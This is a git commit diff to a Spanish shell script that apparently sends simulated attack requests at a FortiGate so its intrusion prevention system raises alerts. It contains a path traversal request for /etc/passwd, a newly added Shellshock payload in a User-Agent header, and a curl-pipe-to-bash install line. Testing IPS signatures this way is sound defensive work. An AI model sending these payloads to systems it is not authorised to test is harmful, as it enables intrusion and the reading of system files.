409e355fe62f97ad7dc938c8e0810f7a5ad2747a
NiPeGun <nipegun@gmail.com>
2024-12-10 13:55:30 +0100

    Update Simular-Ataque-IPS-Fortigate.sh

--- Simular-Ataque-IPS-Fortigate.sh
+++ Simular-Ataque-IPS-Fortigate.sh
@@ -9,10 +9,7 @@
 # Script de NiPeGun para instalar realizar ataques IPS a un FortiGate
 #
 # Ejecución remota con sudo:
-#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Simular-Ataque-IPS-Fortigate.sh | sudo bash
-#
-# Bajar y editar directamente el archivo en nano
-#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Simular-Ataque-IPS-Fortigate.sh | nano -
+#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Simular-Ataque-IPS-Fortigate.sh | bash
 # ----------
 
 # Definir constantes de color
@@ -24,22 +21,13 @@
     #echo "$(tput setaf 1)Mensaje en color rojo. $(tput sgr 0)"
   cFinColor='\033[0m'
 
-# Comprobar si el script está corriendo como root
-  #if [ $(id -u) -ne 0 ]; then     # Sólo comprueba si es root
-  if [[ $EUID -ne 0 ]]; then       # Comprueba si es root o sudo
-    echo ""
-    echo -e "${cColorRojo}  Este script está preparado para ejecutarse con privilegios de administrador (como root o con sudo).${cFinColor}"
-    echo ""
-    exit
-  fi
-
 # Comprobar si el paquete curl está instalado. Si no lo está, instalarlo.
   if [[ $(dpkg-query -s curl 2>/dev/null | grep installed) == "" ]]; then
     echo ""
     echo -e "${cColorRojo}  El paquete curl no está instalado. Iniciando su instalación...${cFinColor}"
     echo ""
-    apt-get -y update
-    apt-get -y install curl
+    sudo apt-get -y update
+    sudo apt-get -y install curl
     echo ""
   fi
 
@@ -55,8 +43,5 @@
 # Alerta: Generic.Path.Traversal.Detection
   curl -X GET "http://"$vIP":80/index.php?page=../../../../etc/passwd"
 
-
-
-
-# Alerta: Comtrend.Devices.Information.Disclosure
-  dirb http://"$vIP":80 -X .html,.js,.txt,.log
+# Alerta: Bash.Function.Definitions.Remote.Code.Execution
+  curl -X GET "http://"$vIP":80" -H "User-Agent: () { :; }; echo 'Exploit'"
